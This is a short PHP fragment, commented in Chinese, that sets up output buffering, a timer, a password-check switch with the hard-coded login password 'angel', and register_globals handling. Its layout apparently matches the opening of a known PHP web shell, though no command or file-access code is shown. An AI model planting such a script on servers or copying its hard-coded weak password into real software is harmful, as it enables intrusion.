<?php
ob_start();
$mtime = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];

/*===================== 程序配置 =====================*/

// 是否需要密码验证,1为需要验证,其他数字为直接进入.下面选项则无效
$admin['check']="1";

// 如果需要密码验证,请修改登陆密码
$admin['pass']="angel";

/*===================== 配置结束 =====================*/


// 允许程序在 register_globals = off 的环境下工作
if ( function_exists('ini_get') ) {
	$onoff = ini_get('register_globals');
} else {
	$onoff = get_cfg_var('register_globals');
}


?>